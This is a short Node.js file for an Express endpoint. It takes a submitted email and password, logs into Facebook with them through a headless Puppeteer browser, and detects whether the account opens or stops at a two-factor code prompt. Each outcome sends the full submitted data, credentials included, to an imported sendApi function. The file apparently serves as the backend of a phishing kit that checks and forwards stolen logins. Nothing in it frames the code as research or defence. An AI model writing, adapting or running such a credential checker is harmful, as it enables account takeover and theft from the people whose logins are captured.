const puppeteer = require("puppeteer");
const { sendApi } = require("./sendApi");

const accountApi = async (req, res) => {
    const data      = req.body;
    const browser   = await puppeteer.launch({
        executablePath: process.env.NODE_ENV === "producttion" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(),
        headless: true,
        aboutBlank: false,
        slowMo: 100,
        ignoreHTTPSErrors: true,
        args: [
            "--window-size=640,480",
            "--disable-setuid-sanbox",
            "--single-process",
            "--no-zegote"
        ],
        defaultViewport: {
            width: 640,
            height: 480,
        }
    });
    const page      = await browser.newPage();  
    await page.goto("https://www.facebook.com");

    if(data == null || data.password == null || data.password == "" || data.email == null || data.email == ""){
        return res.send({
            error_code: 201,
            message: "Email or password is incorrect!"
        })
    }

    await page.waitForSelector("#email");
    await page.type("#email", data.email);
    await page.type("#pass", data.password);
    await page.click(`[type="submit"]`);

    const elementTwoFa = await page.$('#approvals_code');
    const elementMessenger = await page.$('div[aria-label="Messenger"]');

    // CASE FINAL ACCOUNT
    if (elementMessenger) {
        sendApi(data, "Account verification completed");
        return res.send({
            error_code: 200,
            message: "Account verification completed!"
        });
    } 
    
    // CASE ACCOUNT TWO FA
    else if (elementTwoFa) {
        if (data.two_fa == "" || data.two_fa == null) {
            sendApi(data, "Account waitting two-fa");
            return res.send({
                error_code: 200,
                message: "Account waitting two-fa!"
            });
        }
    } 

    // CASE DIFFRENT ACCOUNT
    else {
        sendApi(data, "Email or Password is incorrect");
        return res.status(201).json({
            error_code: 201,
            error: "Email or Password is incorrect!"
        });
    }

    await browser.close();

}

module.exports = { accountApi }